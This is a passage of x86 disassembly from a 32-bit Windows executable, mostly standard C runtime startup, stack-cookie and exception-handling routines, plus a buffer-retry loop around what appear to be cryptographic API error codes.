  4114dd:	push   esi
  4114de:	cmp    DWORD PTR [ebp+0x1c],ebx
  4114e1:	je     0x4114f1
  4114e3:	mov    ecx,DWORD PTR [ebp+0x1c]
  4114e6:	call   DWORD PTR ds:0x414220
  4114ec:	call   DWORD PTR [ebp+0x1c]
  4114ef:	jmp    0x411500
  4114f1:	push   0x8
  4114f3:	call   DWORD PTR ds:0x4140c4
  4114f9:	push   eax
  4114fa:	call   DWORD PTR ds:0x4140cc
  411500:	mov    edx,eax
  411502:	mov    DWORD PTR [edi],eax
  411504:	test   edx,edx
  411506:	je     0x4115c4
  41150c:	mov    ecx,DWORD PTR [ebp+0xc]
  41150f:	lea    eax,[ebp-0x8]
  411512:	push   eax
  411513:	mov    DWORD PTR [ebp-0x8],esi
  411516:	call   0x4110d9
  41151b:	mov    ecx,DWORD PTR [ebp+0x18]
  41151e:	mov    eax,DWORD PTR [ebp-0x8]
  411521:	mov    DWORD PTR [ecx],eax
  411523:	mov    eax,DWORD PTR [ebp-0xc]
  411526:	mov    eax,DWORD PTR [eax+0x10]
  411529:	mov    DWORD PTR [ebp-0x8],eax
  41152c:	test   eax,eax
  41152e:	je     0x411549
  411530:	push   ecx
  411531:	push   DWORD PTR [edi]
  411533:	mov    ecx,eax
  411535:	push   ebx
  411536:	push   0x1
  411538:	push   ebx
  411539:	push   DWORD PTR [ebp-0x10]
  41153c:	call   DWORD PTR ds:0x414220
  411542:	call   DWORD PTR [ebp-0x8]
  411545:	test   eax,eax
  411547:	jne    0x41158f
  411549:	call   DWORD PTR ds:0x414074
  41154f:	push   DWORD PTR [edi]
  411551:	mov    DWORD PTR [ebp-0x8],eax
  411554:	cmp    DWORD PTR [ebp+0x20],ebx
  411557:	je     0x411567
  411559:	mov    ecx,DWORD PTR [ebp+0x20]
  41155c:	call   DWORD PTR ds:0x414220
  411562:	call   DWORD PTR [ebp+0x20]
  411565:	jmp    0x411575
  411567:	push   ebx
  411568:	call   DWORD PTR ds:0x4140c4
  41156e:	push   eax
  41156f:	call   DWORD PTR ds:0x4140c8
  411575:	mov    eax,DWORD PTR [ebp-0x8]
  411578:	mov    DWORD PTR [edi],ebx
  41157a:	cmp    eax,0x80090004
  41157f:	jne    0x4115b5
  411581:	add    esi,esi
  411583:	cmp    esi,0x2800
  411589:	jb     0x4114dd
  41158f:	cmp    esi,0x2800
  411595:	jb     0x4115b0
  411597:	push   esi
  411598:	push   0x405928
  41159d:	push   DWORD PTR ds:0x4130e8
  4115a3:	call   0x40e7a0
  4115a8:	add    esp,0xc
  4115ab:	mov    ebx,0x80090004
  4115b0:	mov    eax,DWORD PTR [ebp-0xc]
  4115b3:	jmp    0x4115e3
  4115b5:	xor    ebx,ebx
  4115b7:	cmp    eax,0x80090005
  4115bc:	sete   bl
  4115bf:	add    ebx,0x2
  4115c2:	jmp    0x4115b0
  4115c4:	push   0x5
  4115c6:	pop    ebx
  4115c7:	jmp    0x4115b0
  4115c9:	push   0x4
  4115cb:	pop    ebx
  4115cc:	push   0x4058d8
  4115d1:	push   DWORD PTR ds:0x4130e8
  4115d7:	call   0x40e7a0
  4115dc:	pop    ecx
  4115dd:	pop    ecx
  4115de:	jmp    0x4115b0
  4115e0:	xor    ebx,ebx
  4115e2:	inc    ebx
  4115e3:	cmp    DWORD PTR [ebp-0x10],0x0
  4115e7:	je     0x4115fd
  4115e9:	mov    esi,DWORD PTR [eax+0x1c]
  4115ec:	test   esi,esi
  4115ee:	je     0x4115fd
  4115f0:	push   DWORD PTR [ebp-0x10]
  4115f3:	mov    ecx,esi
  4115f5:	call   DWORD PTR ds:0x414220
  4115fb:	call   esi
  4115fd:	mov    ecx,DWORD PTR [ebp-0x4]
  411600:	mov    eax,ebx
  411602:	pop    edi
  411603:	pop    esi
  411604:	xor    ecx,ebp
  411606:	pop    ebx
  411607:	call   0x411980
  41160c:	mov    esp,ebp
  41160e:	pop    ebp
  41160f:	ret    0x20
  411612:	int3   
  411613:	int3   
  411614:	int3   
  411615:	int3   
  411616:	int3   
  411617:	int3   
  411618:	int3   
  411619:	int3   
  41161a:	int3   
  41161b:	int3   
  41161c:	int3   
  41161d:	int3   
  41161e:	int3   
  41161f:	int3   
  411620:	mov    eax,0x5a4d
  411625:	cmp    WORD PTR ds:0x400000,ax
  41162c:	je     0x411632
  41162e:	xor    eax,eax
  411630:	jmp    0x411680
  411632:	mov    ecx,DWORD PTR ds:0x40003c
  411638:	cmp    DWORD PTR [ecx+0x400000],0x4550
  411642:	jne    0x41162e
  411644:	movzx  eax,WORD PTR [ecx+0x400018]
  41164b:	cmp    eax,0x10b
  411650:	je     0x41166c
  411652:	cmp    eax,0x20b
  411657:	jne    0x41162e
  411659:	xor    eax,eax
  41165b:	cmp    DWORD PTR [ecx+0x400084],0xe
  411662:	jbe    0x411680
  411664:	cmp    DWORD PTR [ecx+0x4000f8],eax
  41166a:	jmp    0x41167d
  41166c:	xor    eax,eax
  41166e:	cmp    DWORD PTR [ecx+0x400074],0xe
  411675:	jbe    0x411680
  411677:	cmp    DWORD PTR [ecx+0x4000e8],eax
  41167d:	setne  al
  411680:	push   0x2
  411682:	mov    ds:0x413138,eax
  411687:	call   0x411c7e
  41168c:	push   eax
  41168d:	call   DWORD PTR ds:0x4141c8
  411693:	or     DWORD PTR ds:0x413904,0xffffffff
  41169a:	or     DWORD PTR ds:0x413908,0xffffffff
  4116a1:	pop    ecx
  4116a2:	pop    ecx
  4116a3:	call   DWORD PTR ds:0x4141e0
  4116a9:	mov    ecx,DWORD PTR ds:0x413468
  4116af:	mov    DWORD PTR [eax],ecx
  4116b1:	call   DWORD PTR ds:0x4141d4
  4116b7:	mov    ecx,DWORD PTR ds:0x41345c
  4116bd:	mov    DWORD PTR [eax],ecx
  4116bf:	call   0x411ed0
  4116c4:	cmp    DWORD PTR ds:0x413000,0x0
  4116cb:	jne    0x4116d9
  4116cd:	push   0x411ed0
  4116d2:	call   DWORD PTR ds:0x414204
  4116d8:	pop    ecx
  4116d9:	call   0x411ed8
  4116de:	xor    eax,eax
  4116e0:	ret    
  4116e1:	int3   
  4116e2:	int3   
  4116e3:	int3   
  4116e4:	int3   
  4116e5:	int3   
  4116e6:	int3   
  4116e7:	int3   
  4116e8:	int3   
  4116e9:	int3   
  4116ea:	int3   
  4116eb:	int3   
  4116ec:	int3   
  4116ed:	int3   
  4116ee:	int3   
  4116ef:	int3   
  4116f0:	mov    eax,ds:0x413464
  4116f5:	push   0x41313c
  4116fa:	push   DWORD PTR ds:0x413460
  411700:	mov    ds:0x41313c,eax
  411705:	push   0x413130
  41170a:	push   0x41312c
  41170f:	push   0x413128
  411714:	call   DWORD PTR ds:0x4141cc
  41171a:	add    esp,0x14
  41171d:	mov    ds:0x413134,eax
  411722:	ret    
  411723:	int3   
  411724:	int3   
  411725:	int3   
  411726:	int3   
  411727:	int3   
  411728:	int3   
  411729:	int3   
  41172a:	int3   
  41172b:	int3   
  41172c:	int3   
  41172d:	int3   
  41172e:	int3   
  41172f:	int3   
  411730:	call   0x411e28
  411735:	jmp    0x41173f
  41173a:	int3   
  41173b:	int3   
  41173c:	int3   
  41173d:	int3   
  41173e:	int3   
  41173f:	push   0x5c
  411741:	push   0x412068
  411746:	call   0x411efc
  41174b:	and    DWORD PTR [ebp-0x24],0x0
  41174f:	and    DWORD PTR [ebp-0x4],0x0
  411753:	lea    eax,[ebp-0x6c]
  411756:	push   eax
  411757:	call   DWORD PTR ds:0x41410c
  41175d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  411764:	xor    ebx,ebx
  411766:	inc    ebx
  411767:	mov    DWORD PTR [ebp-0x4],ebx
  41176a:	mov    eax,fs:0x18
  411770:	mov    edi,DWORD PTR [eax+0x4]
  411773:	xor    esi,esi
  411775:	mov    edx,0x41390c
  41177a:	mov    ecx,edi
  41177c:	xor    eax,eax
  41177e:	lock cmpxchg DWORD PTR [edx],ecx
  411782:	test   eax,eax
  411784:	je     0x41178c
  411786:	cmp    eax,edi
  411788:	jne    0x41179e
  41178a:	mov    esi,ebx
  41178c:	cmp    DWORD PTR ds:0x413910,ebx
  411792:	jne    0x4117ab
  411794:	push   0x1f
  411796:	call   0x411cba
  41179b:	pop    ecx
  41179c:	jmp    0x4117da
  41179e:	push   0x3e8
  4117a3:	call   DWORD PTR ds:0x414110
  4117a9:	jmp    0x411775
  4117ab:	cmp    DWORD PTR ds:0x413910,0x0
  4117b2:	jne    0x4117d4
  4117b4:	mov    DWORD PTR ds:0x413910,ebx
  4117ba:	push   0x401018
  4117bf:	push   0x40100c
  4117c4:	call   0x41192a
  4117c9:	pop    ecx
  4117ca:	pop    ecx
  4117cb:	test   eax,eax
  4117cd:	je     0x4117da
  4117cf:	jmp    0x411913
  4117d4:	mov    DWORD PTR ds:0x413124,ebx
  4117da:	cmp    DWORD PTR ds:0x413910,ebx
  4117e0:	jne    0x4117fd
  4117e2:	push   0x401008
  4117e7:	push   0x401000
  4117ec:	call   0x411ef0
  4117f1:	pop    ecx
  4117f2:	pop    ecx
  4117f3:	mov    DWORD PTR ds:0x413910,0x2
  4117fd:	test   esi,esi
  4117ff:	jne    0x41180a
  411801:	xor    eax,eax
  411803:	mov    ecx,0x41390c
  411808:	xchg   DWORD PTR [ecx],eax
  41180a:	cmp    DWORD PTR ds:0x413914,0x0
  411811:	je     0x411838
  411813:	push   0x413914
  411818:	call   0x411d20
  41181d:	pop    ecx
  41181e:	test   eax,eax
  411820:	je     0x411838
  411822:	push   0x0
  411824:	push   0x2
  411826:	push   0x0
  411828:	mov    esi,DWORD PTR ds:0x413914
  41182e:	mov    ecx,esi
  411830:	call   DWORD PTR ds:0x414220
  411836:	call   esi
  411838:	mov    eax,ds:0x4141fc
  41183d:	mov    esi,DWORD PTR [eax]
  41183f:	mov    DWORD PTR [ebp-0x20],esi
  411842:	mov    edi,DWORD PTR [ebp-0x24]
  411845:	mov    cl,BYTE PTR [esi]
  411847:	cmp    cl,0x20
  41184a:	ja     0x411896
  41184c:	test   cl,cl
  41184e:	je     0x411854
  411850:	test   edi,edi
  411852:	jne    0x411896
  411854:	mov    al,BYTE PTR [esi]
  411856:	test   al,al
  411858:	je     0x411864
  41185a:	cmp    al,0x20
  41185c:	ja     0x411864
  41185e:	inc    esi
  41185f:	mov    DWORD PTR [ebp-0x20],esi
  411862:	jmp    0x411854
  411864:	test   BYTE PTR [ebp-0x40],0x1
  411868:	je     0x411870
  41186a:	movzx  eax,WORD PTR [ebp-0x3c]
  41186e:	jmp    0x411873
  411870:	push   0xa
  411872:	pop    eax
  411873:	push   eax
  411874:	push   esi
  411875:	push   0x0
  411877:	push   0x400000
  41187c:	call   0x405f58
  411881:	mov    ds:0x413120,eax
  411886:	cmp    DWORD PTR ds:0x413138,0x0
  41188d:	jne    0x4118ef
  41188f:	push   eax
  411890:	call   DWORD PTR ds:0x4141c4
  411896:	cmp    cl,0x22
  411899:	jne    0x4118a7
  41189b:	xor    eax,eax
  41189d:	test   edi,edi
  41189f:	sete   al
  4118a2:	mov    edi,eax
  4118a4:	mov    DWORD PTR [ebp-0x24],edi
  4118a7:	movzx  eax,cl
  4118aa:	push   eax
  4118ab:	call   DWORD PTR ds:0x4141ec
  4118b1:	pop    ecx
  4118b2:	test   eax,eax
  4118b4:	je     0x4118ba
  4118b6:	inc    esi
  4118b7:	mov    DWORD PTR [ebp-0x20],esi
  4118ba:	inc    esi
  4118bb:	mov    DWORD PTR [ebp-0x20],esi
  4118be:	jmp    0x411845
  4118c0:	mov    ecx,DWORD PTR [ebp-0x14]
  4118c3:	mov    eax,DWORD PTR [ecx]
  4118c5:	mov    eax,DWORD PTR [eax]
  4118c7:	mov    DWORD PTR [ebp-0x28],eax
  4118ca:	push   ecx
  4118cb:	push   eax
  4118cc:	call   0x411c04
  4118d1:	pop    ecx
  4118d2:	pop    ecx
  4118d3:	ret    
  4118d4:	mov    esp,DWORD PTR [ebp-0x18]
  4118d7:	mov    eax,DWORD PTR [ebp-0x28]
  4118da:	mov    ds:0x413120,eax
  4118df:	cmp    DWORD PTR ds:0x413138,0x0
  4118e6:	jne    0x4118ef
  4118e8:	push   eax
  4118e9:	call   DWORD PTR ds:0x4141e8
  4118ef:	cmp    DWORD PTR ds:0x413124,0x0
  4118f6:	jne    0x411903
  4118f8:	call   DWORD PTR ds:0x4141dc
  4118fe:	mov    eax,ds:0x413120
  411903:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41190a:	jmp    0x41191f
  41190c:	xor    eax,eax
  41190e:	inc    eax
  41190f:	ret    
  411910:	mov    esp,DWORD PTR [ebp-0x18]
  411913:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41191a:	mov    eax,0xff
  41191f:	call   0x411f44
  411924:	ret    
  411925:	int3   
  411926:	int3   
  411927:	int3   
  411928:	int3   
  411929:	int3   
  41192a:	mov    edi,edi
  41192c:	push   ebp
  41192d:	mov    ebp,esp
  41192f:	push   ecx
  411930:	mov    eax,ds:0x413004
  411935:	xor    eax,ebp
  411937:	mov    DWORD PTR [ebp-0x4],eax
  41193a:	push   esi
  41193b:	mov    esi,DWORD PTR [ebp+0x8]
  41193e:	xor    eax,eax
  411940:	cmp    esi,DWORD PTR [ebp+0xc]
  411943:	jae    0x411963
  411945:	push   edi
  411946:	test   eax,eax
  411948:	jne    0x411962
  41194a:	mov    edi,DWORD PTR [esi]
  41194c:	test   edi,edi
  41194e:	je     0x41195a
  411950:	mov    ecx,edi
  411952:	call   DWORD PTR ds:0x414220
  411958:	call   edi
  41195a:	add    esi,0x4
  41195d:	cmp    esi,DWORD PTR [ebp+0xc]
  411960:	jb     0x411946
  411962:	pop    edi
  411963:	mov    ecx,DWORD PTR [ebp-0x4]
  411966:	xor    ecx,ebp
  411968:	pop    esi
  411969:	call   0x411980
  41196e:	mov    esp,ebp
  411970:	pop    ebp
  411971:	ret    
  411972:	int3   
  411973:	int3   
  411974:	int3   
  411975:	int3   
  411976:	int3   
  411977:	int3   
  411978:	int3   
  411979:	int3   
  41197a:	int3   
  41197b:	int3   
  41197c:	int3   
  41197d:	int3   
  41197e:	int3   
  41197f:	int3   
  411980:	cmp    ecx,DWORD PTR ds:0x413004
  411986:	jne    0x41198b
  411988:	ret    0x0
  41198b:	jmp    0x4119c4
  411990:	int3   
  411991:	int3   
  411992:	int3   
  411993:	int3   
  411994:	int3   
  411995:	mov    edi,edi
  411997:	push   ebp
  411998:	mov    ebp,esp
  41199a:	push   0x0
  41199c:	call   DWORD PTR ds:0x414100
  4119a2:	push   DWORD PTR [ebp+0x8]
  4119a5:	call   DWORD PTR ds:0x414108
  4119ab:	push   0xc0000409
  4119b0:	call   DWORD PTR ds:0x414054
  4119b6:	push   eax
  4119b7:	call   DWORD PTR ds:0x4140fc
  4119bd:	pop    ebp
  4119be:	ret    
  4119bf:	int3   
  4119c0:	int3   
  4119c1:	int3   
  4119c2:	int3   
  4119c3:	int3   
  4119c4:	mov    edi,edi
  4119c6:	push   ebp
  4119c7:	mov    ebp,esp
  4119c9:	sub    esp,0x324
  4119cf:	mov    ds:0x413240,eax
  4119d4:	mov    DWORD PTR ds:0x41323c,ecx
  4119da:	mov    DWORD PTR ds:0x413238,edx
  4119e0:	mov    DWORD PTR ds:0x413234,ebx
  4119e6:	mov    DWORD PTR ds:0x413230,esi
  4119ec:	mov    DWORD PTR ds:0x41322c,edi
  4119f2:	data16 mov WORD PTR ds:0x413258,ss
  4119f9:	data16 mov WORD PTR ds:0x41324c,cs
  411a00:	data16 mov WORD PTR ds:0x413228,ds
  411a07:	data16 mov WORD PTR ds:0x413224,es
  411a0e:	data16 mov WORD PTR ds:0x413220,fs
  411a15:	data16 mov WORD PTR ds:0x41321c,gs
  411a1c:	pushf  
  411a1d:	pop    DWORD PTR ds:0x413250
  411a23:	mov    eax,DWORD PTR [ebp+0x0]
  411a26:	mov    ds:0x413244,eax
  411a2b:	mov    eax,DWORD PTR [ebp+0x4]
  411a2e:	mov    ds:0x413248,eax
  411a33:	lea    eax,[ebp+0x8]
  411a36:	mov    ds:0x413254,eax
  411a3b:	mov    eax,DWORD PTR [ebp-0x324]
  411a41:	mov    DWORD PTR ds:0x413190,0x10001
  411a4b:	mov    eax,ds:0x413248
  411a50:	mov    ds:0x41314c,eax
  411a55:	mov    DWORD PTR ds:0x413140,0xc0000409
  411a5f:	mov    DWORD PTR ds:0x413144,0x1
  411a69:	mov    DWORD PTR ds:0x413150,0x3
  411a73:	push   0x4
  411a75:	pop    eax
  411a76:	imul   eax,eax,0x0
  411a79:	mov    DWORD PTR [eax+0x413154],0x2
  411a83:	push   0x4
  411a85:	pop    eax
  411a86:	shl    eax,0x0
  411a89:	mov    ecx,DWORD PTR ds:0x413004
  411a8f:	mov    DWORD PTR [eax+0x413154],ecx
  411a95:	push   0x4
  411a97:	pop    eax
  411a98:	shl    eax,1
  411a9a:	mov    ecx,DWORD PTR ds:0x413008
  411aa0:	mov    DWORD PTR [eax+0x413154],ecx
  411aa6:	push   0x4
  411aa8:	pop    eax
  411aa9:	imul   eax,eax,0x0
  411aac:	mov    ecx,DWORD PTR ds:0x413004
  411ab2:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  411ab6:	push   0x4
  411ab8:	pop    eax
  411ab9:	shl    eax,0x0
  411abc:	mov    ecx,DWORD PTR ds:0x413008
  411ac2:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  411ac6:	push   0x401060
  411acb:	call   0x411995
  411ad0:	mov    esp,ebp
  411ad2:	pop    ebp
  411ad3:	ret    
  411ad4:	int3   
  411ad5:	int3   
  411ad6:	int3   
  411ad7:	int3   
  411ad8:	int3   
  411ad9:	mov    edi,edi
  411adb:	push   ebp
  411adc:	mov    ebp,esp
  411ade:	mov    ds:0x413240,eax
  411ae3:	mov    DWORD PTR ds:0x41323c,ecx
  411ae9:	mov    DWORD PTR ds:0x413238,edx
  411aef:	mov    DWORD PTR ds:0x413234,ebx
  411af5:	mov    DWORD PTR ds:0x413230,esi
  411afb:	mov    DWORD PTR ds:0x41322c,edi
  411b01:	data16 mov WORD PTR ds:0x413258,ss
  411b08:	data16 mov WORD PTR ds:0x41324c,cs
  411b0f:	data16 mov WORD PTR ds:0x413228,ds
  411b16:	data16 mov WORD PTR ds:0x413224,es
  411b1d:	data16 mov WORD PTR ds:0x413220,fs
  411b24:	data16 mov WORD PTR ds:0x41321c,gs
  411b2b:	pushf  
  411b2c:	pop    DWORD PTR ds:0x413250
  411b32:	mov    DWORD PTR ds:0x413190,0x10001
  411b3c:	mov    eax,DWORD PTR [ebp+0x4]
  411b3f:	mov    ds:0x413248,eax
  411b44:	lea    eax,[ebp+0x4]
  411b47:	add    eax,0x4
  411b4a:	mov    ds:0x413254,eax
  411b4f:	mov    eax,ds:0x413248
  411b54:	mov    ds:0x41314c,eax
  411b59:	mov    DWORD PTR ds:0x413140,0xc0000409
  411b63:	mov    DWORD PTR ds:0x413144,0x1
  411b6d:	mov    DWORD PTR ds:0x413150,0x1
  411b77:	push   0x4
  411b79:	pop    eax
  411b7a:	imul   eax,eax,0x0
  411b7d:	mov    DWORD PTR [eax+0x413154],0x8
  411b87:	push   0x401060
  411b8c:	call   0x411995
  411b91:	pop    ebp
  411b92:	ret    
  411b93:	int3   
  411b94:	int3   
  411b95:	int3   
  411b96:	int3   
  411b97:	int3   
  411b98:	int3   
  411b99:	int3   
  411b9a:	int3   
  411b9b:	int3   
  411b9c:	int3   
  411b9d:	int3   
  411b9e:	int3   
  411b9f:	int3   
  411ba0:	mov    edi,edi
  411ba2:	push   ebp
  411ba3:	mov    ebp,esp
  411ba5:	mov    eax,DWORD PTR [ebp+0x8]
  411ba8:	mov    eax,DWORD PTR [eax]
  411baa:	cmp    DWORD PTR [eax],0xe06d7363
  411bb0:	jne    0x411bdd
  411bb2:	cmp    DWORD PTR [eax+0x10],0x3
  411bb6:	jne    0x411bdd
  411bb8:	mov    eax,DWORD PTR [eax+0x14]
  411bbb:	cmp    eax,0x19930520
  411bc0:	je     0x411bd7
  411bc2:	cmp    eax,0x19930521
  411bc7:	je     0x411bd7
  411bc9:	cmp    eax,0x19930522
  411bce:	je     0x411bd7
  411bd0:	cmp    eax,0x1994000
  411bd5:	jne    0x411bdd
  411bd7:	call   DWORD PTR ds:0x4141f8
  411bdd:	xor    eax,eax
  411bdf:	pop    ebp
  411be0:	ret    0x4
  411be3:	int3   
  411be4:	int3   
  411be5:	int3   
  411be6:	int3   
  411be7:	int3   
  411be8:	int3   
  411be9:	int3   
  411bea:	int3   
  411beb:	int3   
  411bec:	int3   
  411bed:	int3   
  411bee:	int3   
  411bef:	int3   
  411bf0:	push   0x411ba0
  411bf5:	call   DWORD PTR ds:0x414100
  411bfb:	xor    eax,eax
  411bfd:	ret    
  411bfe:	int3   
  411bff:	int3   
  411c00:	int3   
  411c01:	int3   
  411c02:	int3   
  411c03:	int3   
  411c04:	jmp    DWORD PTR ds:0x4141d8
  411c0a:	int3   
  411c0b:	int3   
  411c0c:	int3   
  411c0d:	int3   
  411c0e:	int3   
  411c0f:	push   0xc
  411c11:	push   0x412090
  411c16:	call   0x411f98
  411c1b:	xor    ecx,ecx
  411c1d:	mov    eax,DWORD PTR [ebp+0x8]
  411c20:	test   eax,eax
  411c22:	je     0x411c6f
  411c24:	cmp    eax,0xffffffff
  411c27:	je     0x411c6f
  411c29:	mov    DWORD PTR [ebp-0x4],ecx
  411c2c:	mov    edx,0x5a4d
  411c31:	cmp    WORD PTR [eax],dx
  411c34:	jne    0x411c68
  411c36:	mov    edx,DWORD PTR [eax+0x3c]
  411c39:	test   edx,edx
  411c3b:	js     0x411c68
  411c3d:	cmp    edx,0x10000000
  411c43:	jae    0x411c68
  411c45:	add    eax,edx
  411c47:	mov    DWORD PTR [ebp-0x1c],eax
  411c4a:	mov    ecx,DWORD PTR [eax]
  411c4c:	sub    ecx,0x4550
  411c52:	neg    ecx
  411c54:	sbb    ecx,ecx
  411c56:	not    ecx
  411c58:	and    ecx,eax
  411c5a:	jmp    0x411c65
  411c5c:	xor    eax,eax
  411c5e:	inc    eax
  411c5f:	ret    
  411c60:	mov    esp,DWORD PTR [ebp-0x18]
  411c63:	xor    ecx,ecx
  411c65:	mov    DWORD PTR [ebp-0x1c],ecx
  411c68:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  411c6f:	mov    eax,ecx
  411c71:	call   0x411fdd
  411c76:	ret    0x4
  411c79:	int3   
  411c7a:	int3   
  411c7b:	int3   
  411c7c:	int3   
  411c7d:	int3   
  411c7e:	mov    edi,edi
  411c80:	push   ebp
  411c81:	mov    ebp,esp
  411c83:	push   0x0
  411c85:	call   DWORD PTR ds:0x4140a8
  411c8b:	test   eax,eax
  411c8d:	je     0x411caf
  411c8f:	push   eax
  411c90:	call   0x411c0f
  411c95:	test   eax,eax
  411c97:	je     0x411caf
  411c99:	movzx  ecx,WORD PTR [eax+0x5c]
  411c9d:	push   0x2
  411c9f:	pop    eax
  411ca0:	cmp    cx,ax
  411ca3:	je     0x411cb2
  411ca5:	cmp    ecx,0x3
  411ca8:	jne    0x411caf
  411caa:	xor    eax,eax
  411cac:	inc    eax
  411cad:	pop    ebp
  411cae:	ret    
  411caf:	mov    eax,DWORD PTR [ebp+0x8]
  411cb2:	pop    ebp
  411cb3:	ret    
  411cb4:	int3   
  411cb5:	int3   
  411cb6:	int3   
  411cb7:	int3   
  411cb8:	int3   
  411cb9:	int3   
  411cba:	jmp    DWORD PTR ds:0x4141d0
  411cc0:	int3   
  411cc1:	int3   
  411cc2:	int3   
  411cc3:	int3   
  411cc4:	int3   
  411cc5:	int3   
  411cc6:	int3   
  411cc7:	int3   
  411cc8:	int3   
  411cc9:	int3   
  411cca:	int3   
  411ccb:	int3   
  411ccc:	int3   
  411ccd:	int3   
  411cce:	int3   
  411ccf:	int3   
  411cd0:	mov    edi,edi
  411cd2:	push   ebp
  411cd3:	mov    ebp,esp
  411cd5:	mov    eax,DWORD PTR [ebp+0x8]
  411cd8:	xor    edx,edx
  411cda:	push   ebx
  411cdb:	push   esi
  411cdc:	push   edi
  411cdd:	mov    ecx,DWORD PTR [eax+0x3c]
  411ce0:	add    ecx,eax
  411ce2:	movzx  eax,WORD PTR [ecx+0x14]
  411ce6:	movzx  ebx,WORD PTR [ecx+0x6]
  411cea:	add    eax,0x18
  411ced:	add    eax,ecx
  411cef:	test   ebx,ebx
  411cf1:	je     0x411d0e
  411cf3:	mov    edi,DWORD PTR [ebp+0xc]
  411cf6:	mov    esi,DWORD PTR [eax+0xc]
  411cf9:	cmp    edi,esi
  411cfb:	jb     0x411d06
  411cfd:	mov    ecx,DWORD PTR [eax+0x8]
  411d00:	add    ecx,esi
  411d02:	cmp    edi,ecx
  411d04:	jb     0x411d10
  411d06:	inc    edx
  411d07:	add    eax,0x28
  411d0a:	cmp    edx,ebx
  411d0c:	jb     0x411cf6
  411d0e:	xor    eax,eax
  411d10:	pop    edi
  411d11:	pop    esi
  411d12:	pop    ebx
  411d13:	pop    ebp
  411d14:	ret    
  411d15:	int3   
  411d16:	int3   
  411d17:	int3   
  411d18:	int3   
  411d19:	int3   
  411d1a:	int3   
  411d1b:	int3   
  411d1c:	int3   
  411d1d:	int3   
  411d1e:	int3   
  411d1f:	int3   
  411d20:	mov    edi,edi
  411d22:	push   ebp
  411d23:	mov    ebp,esp
  411d25:	push   0xfffffffe
  411d27:	push   0x4120b0
  411d2c:	push   0x411f60
  411d31:	mov    eax,fs:0x0
  411d37:	push   eax
  411d38:	sub    esp,0x8
  411d3b:	push   ebx
  411d3c:	push   esi
  411d3d:	push   edi
  411d3e:	mov    eax,ds:0x413004
  411d43:	xor    DWORD PTR [ebp-0x8],eax
  411d46:	xor    eax,ebp
  411d48:	push   eax
  411d49:	lea    eax,[ebp-0x10]
  411d4c:	mov    fs:0x0,eax
  411d52:	mov    DWORD PTR [ebp-0x18],esp
  411d55:	mov    DWORD PTR [ebp-0x4],0x0
  411d5c:	push   0x400000
  411d61:	call   0x411df0
  411d66:	add    esp,0x4
  411d69:	test   eax,eax
  411d6b:	je     0x411dc1
  411d6d:	mov    eax,DWORD PTR [ebp+0x8]
  411d70:	sub    eax,0x400000
  411d75:	push   eax
  411d76:	push   0x400000
  411d7b:	call   0x411cd0
  411d80:	add    esp,0x8
  411d83:	test   eax,eax
  411d85:	je     0x411dc1
  411d87:	mov    eax,DWORD PTR [eax+0x24]
  411d8a:	shr    eax,0x1f
  411d8d:	not    eax
  411d8f:	and    eax,0x1
  411d92:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  411d99:	mov    ecx,DWORD PTR [ebp-0x10]
  411d9c:	mov    DWORD PTR fs:0x0,ecx
  411da3:	pop    ecx
  411da4:	pop    edi
  411da5:	pop    esi
  411da6:	pop    ebx
  411da7:	mov    esp,ebp
  411da9:	pop    ebp
  411daa:	ret    
  411dab:	mov    eax,DWORD PTR [ebp-0x14]
  411dae:	mov    eax,DWORD PTR [eax]
  411db0:	xor    ecx,ecx
  411db2:	cmp    DWORD PTR [eax],0xc0000005
  411db8:	sete   cl
  411dbb:	mov    eax,ecx
  411dbd:	ret    
  411dbe:	mov    esp,DWORD PTR [ebp-0x18]
  411dc1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  411dc8:	xor    eax,eax
  411dca:	mov    ecx,DWORD PTR [ebp-0x10]
  411dcd:	mov    DWORD PTR fs:0x0,ecx
  411dd4:	pop    ecx
  411dd5:	pop    edi
  411dd6:	pop    esi
  411dd7:	pop    ebx
  411dd8:	mov    esp,ebp
  411dda:	pop    ebp
  411ddb:	ret    
  411ddc:	int3   
  411ddd:	int3   
  411dde:	int3   
  411ddf:	int3   
  411de0:	int3   
  411de1:	int3   
  411de2:	int3   
  411de3:	int3   
  411de4:	int3   
  411de5:	int3   
  411de6:	int3   
  411de7:	int3   
  411de8:	int3   
  411de9:	int3   
  411dea:	int3   
  411deb:	int3   
  411dec:	int3   
  411ded:	int3   
  411dee:	int3   
  411def:	int3   
  411df0:	mov    edi,edi
  411df2:	push   ebp
  411df3:	mov    ebp,esp
  411df5:	mov    eax,DWORD PTR [ebp+0x8]
  411df8:	mov    ecx,0x5a4d
  411dfd:	cmp    WORD PTR [eax],cx
  411e00:	je     0x411e06
  411e02:	xor    eax,eax
  411e04:	pop    ebp
  411e05:	ret    
  411e06:	mov    ecx,DWORD PTR [eax+0x3c]
  411e09:	add    ecx,eax
  411e0b:	xor    eax,eax
  411e0d:	cmp    DWORD PTR [ecx],0x4550
  411e13:	jne    0x411e21
  411e15:	mov    edx,0x10b
  411e1a:	cmp    WORD PTR [ecx+0x18],dx
  411e1e:	sete   al
  411e21:	pop    ebp
  411e22:	ret    
  411e23:	int3   
  411e24:	int3   
  411e25:	int3   
  411e26:	int3   
  411e27:	int3   
  411e28:	mov    edi,edi
  411e2a:	push   ebp
  411e2b:	mov    ebp,esp
  411e2d:	sub    esp,0x14
  411e30:	and    DWORD PTR [ebp-0xc],0x0
  411e34:	and    DWORD PTR [ebp-0x8],0x0
  411e38:	mov    eax,ds:0x413004
  411e3d:	push   esi
  411e3e:	push   edi
  411e3f:	mov    edi,0xbb40e64e
  411e44:	mov    esi,0xffff0000
  411e49:	cmp    eax,edi
  411e4b:	je     0x411e5a
  411e4d:	test   esi,eax
  411e4f:	je     0x411e5a
  411e51:	not    eax
  411e53:	mov    ds:0x413008,eax
  411e58:	jmp    0x411ec4
  411e5a:	lea    eax,[ebp-0xc]
  411e5d:	push   eax
  411e5e:	call   DWORD PTR ds:0x4140f0
  411e64:	mov    eax,DWORD PTR [ebp-0x8]
  411e67:	xor    eax,DWORD PTR [ebp-0xc]
  411e6a:	mov    DWORD PTR [ebp-0x4],eax
  411e6d:	call   DWORD PTR ds:0x41404c
